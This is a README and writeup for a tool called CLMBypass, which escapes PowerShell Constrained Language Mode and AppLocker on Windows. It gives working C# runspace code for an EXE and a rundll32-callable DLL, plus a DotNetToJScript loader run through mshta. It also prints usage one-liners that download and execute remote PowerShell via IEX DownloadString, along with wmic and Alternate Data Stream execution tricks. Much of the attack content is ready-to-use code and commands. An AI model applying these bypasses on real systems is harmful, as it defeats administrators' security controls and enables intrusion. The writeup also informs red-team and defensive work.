# Table of Contents

- [Usage](#Usage)
- [Writeup](#Writeup)

<br>

# Usage

Bypass Constrained Language Mode in PowerShell, based off of [SecJuice's](https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/) article. Also comes with a stager in case AppLocker is being used, used [DotNetToJScript](https://github.com/tyranid/DotNetToJScript) and [the mshta.exe AWL bypass](https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-mshta-exe/).

-----

### [CLMBypass.dll](https://github.com/stonepresto/CLMBypass/blob/master/src/DLLProgram.cs)

- Using the DllExport library and properly formatted functions, it is possible to exeucte DLLs with `rundll32.exe` and .NET Framework support, which allows the use of `System.Managment.Automation`
- **Usage:** `rundll32.exe CLMBypass.dll,Run IEX(New-Object Net.WebClient).DownloadString('http://localhost/somescript.ps1');`

### [CLMBypass.hta](https://github.com/stonepresto/CLMBypass/blob/master/src/CLMBypass.hta)

- The WScript.Shell creates a new runspace
- `payload.ps1` is downloaded and executed in FullLanguage mode
- **Usage:** `mshta.exe http://localhost/CLMBypass.hta`

### [CLMBypass.exe](https://github.com/stonepresto/CLMBypass/blob/master/src/Program.cs)

- Compiled as PE32 .NET Framework 4.0
- **Usage:** `.\CLMBypass.exe "IEX(New-Object Net.WebClient).DownloadString('http://localhost/somescript.ps1')"`

<br><br><br>

# Writeup 

## Exploring Ways Around Windows Security Measures

#### Foreword

The security team working on Microsoft Windows have a number of options available for Domain Administrators attempting to lock down an Active Directory environment. This is primarily accomplished through Group Policy Objects (GPOs) that restrict what a normal user can do on a given host, which propogate throughout the domain. Two of the most common measures taken by network owners is the use of AppLocker and restricted PowerShell sessions. The question then, is how might an attacker bypass these measures?

Please note the Microsoft Windows Security team does not consider any of these measures full restrictions, only ways to mitigate a given threat model. It should also be noted that all of these methods are open source and public knowledge, and thus it should be expected that any attacker on a network is capable of the following.

-----

### Restricted PowerShell - Constrained Language Mode (CLM)

As previously mentioned, one of the primary mitigations taken by network owners is restriction of what a powershell session can accomplish. Constrained Language Mode dissallows things such COM objects, many .NET objects, classes, an many other tools an attacker might find useful. Specifically, this mitigates the threat of someone in the organization becoming a codez kiddie and using open source tools such as [Kerberoast](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1) or [Mimikatz](https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1) against the host or network to escalate privileges and wreak havoc in the organization.

#### Method 1.1: Easy wins

The first method is of course to try the simple things, such as... 

... a PowerShell downgrade to version 2,

```
C:\> powershell.exe -version 2
```

... creating a new runspace with COM objects, 

```
New-Object -ComObject WScript.Shell
```

... using a flaw in older `rundll32.exe` versions,

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("Hello from JS :D");
```

... or even doing [path manipulation](https://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/).

However, these are easily mitigated by uninstalling older versions of powershell, dissallowing more commands in PoSh sessions, and enforcing a standard path for all environments that cannot be changed. Easy to fix means likely to have been mitigated, so time to move on.

#### Method 1.2: Writing CODE?! :scream:

So the host is a little more hardened than you expected. Time to get your hands dirty in Visual Studio and start utilizing the .NET Framework to your advantage. Since Portable Executables can be compiled with all their dependencies, we can leverage libraries such as `System.Management.Automation` to create a new powershell runspace.

```c#
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;


namespace CLMBypass
{
    public class CLMBypass
    {
        public void Main(string arg)
        {
            System.Management.Automation.Runspaces.Runspace run = System.Management.Automation.Runspaces.RunspaceFactory.CreateRunspace();
            run.Open();

            System.Management.Automation.PowerShell shell = System.Management.Automation.PowerShell.Create();
            shell.Runspace = run;

            shell.AddScript(arg);
            shell.Invoke();

            run.Close();
        }
    }
}
```

Compiling this while referencing the _proper version_ of `System.Management.Automation.dll` (if you are compiling for older .NET Framework versions such as 4.0, you'll need to manually reference this library instead of using NuGet) allows for creating of a new runspace under a different [Runspace](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.runspace?view=pscore-6.2.0). This allows you to interact directly with the "engine" PowerShell runs on, instead of using a host application such as `powershell.exe`. Thus, the restrictions to `powershell.exe` are not applied!

Unfortunately, its rarely this easy. Since the above solution must be compiled, it is easily stopped by enforcing AppLocker on a host and restricting which executables can be ran. Which brings us to round two, bypassing App White Listing!

### AppLocker and App White Listing (AWL)

All that work that was put into writing a whole _twenty-five_ lines of code was just thwarted... the _horror_. Don't fret though, there are still many ways around AppLocker, as long as it is not too restrictive. More on that later in the conclusion.

#### Method 2.1: _More_ easy wins

The easiest way for an attacker to bypass AppLocker is just based off of poor configuration of the host. The rule of thumb here is if (almost) any directory under `C:\Windows\` is writeable and the GPO is only checking the filepath to verify an executable, then an easy win is simply copying the desired payload over to the writeable directory. Another easy win is [Alternate Data Streams](https://hitco.at/blog/howto-prevent-bypassing-applocker-using-alternate-data-streams/) and execution through the beloved `wmic`...

```
C:\> type C:\path\to\payload.exe > C:\Program Files (x86)\SomeApp\logs:payload.exe
C:\> wmic process call create '"%CD%\logs:payload.exe"'
```

But as previously mentioned, these are easily restricted and often are not enough, we want something more robust.

#### Method 2.2: JavaScript shenanigans

Well, as it turns out, Microsoft Windows loves to be backwards compatible. This means including a lot of binaries that do not get used very often, including `mshta.exe` which is part of the [deprecated](https://www.microsoft.com/en-us/windowsforbusiness/end-of-ie-support) Internet Explorer. If the GPO does not block using scripts, it is easy enough to use [DotNetToJScript](https://github.com/tyranid/DotNetToJScript) to JavaScript-ify an executable by creating serialized data, encoding it in base64, and then deserializing it and running it after being "formatted" as a binary. [Here](https://github.com/stonepresto/CLMBypass/blob/master/src/CLMBypass.js) is an example, but the relevant snippet is below...

```js
var stm = base64ToStream(serialized_obj);
var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
var al = new ActiveXObject('System.Collections.ArrayList');
var d = fmt.Deserialize_2(stm);
al.Add(undefined);
var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
```

This script can be tagged an ran in a `.hta` file by `mshta.exe`, resulting in the execution of the binary. With a little extra work you can even pass arguments!

Again, this is mitigated quite easily by disabling the execution of scripts on the host. This mitigation eliminates almost all attack vectors that utilize JavaScript or Visual Basic.

#### Method 2.3: DLL's are basically EXE's, right?

If nothing has worked up until this point, it's likely there is a fairly strick AppLocker policy in place. However, there is one last relatively easy to use hole in configuration. When configuring AppLocker, there is an option to restrict the DLLs that can be run on a host to only certain ones, such as those in `C:\Windows\` or `C:\Program Files\`. However, because this can induce quite a large performance hit depending on what software is being run, many network administrators do not enforce this rule. This opens up a vector of attack.

In the end, Dynamically Linked Libraries are still executable binaries, they just don't have certain characteristics of PEs, such as entry points, their own process, or threads. However, for whatever reason, there exists `rundll32.exe` that calls a specified entrypoint, expecting certain parameters. More information on this can be found [here](https://support.microsoft.com/en-us/help/164787/info-windows-rundll-and-rundll32-interface). If a function is constructed with the correct arguments and is made visible via [DllExport](https://github.com/3F/DllExport), then it is possible to call and pass arguments to a DLL with `rundll32.exe`.

```c#
using System;
using System.Runtime.InteropServices;

namespace CLMBypass
{
    class Program
    {
        [DllExport("Run", CallingConvention = CallingConvention.StdCall)]
        public static void Run(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow)
        {
            System.Management.Automation.Runspaces.Runspace run = System.Management.Automation.Runspaces.RunspaceFactory.CreateRunspace();
            run.Open();

            System.Management.Automation.PowerShell shell = System.Management.Automation.PowerShell.Create();
            shell.Runspace = run;

            shell.AddScript(lpszCmdLine);
            shell.Invoke();

            run.Close();
        }
    }
}
```

The above code, once compiled as a class library, can be used as such...

```
C:\> rundll32.exe C:\path\to\payload.dll,Run "IEX(Get-Content('payload.ps1'))"
```

This will execute payload.ps1 in a different runspace than the one created by the DLL.

The blocking mechanism for this is of course to limit what DLLs can be run on the host, but as previously mentioned, this is not often implemented due to the fear of performance reduction.

If the DLLs are restrictied, team blue has successfully mitigated most if not all of the _easy_ paths to unrestricted execution on the host. 
<br><br>
<div style="text-align:center">

**Enumerate and get creative!**

cheers!

stonepresto
</div>
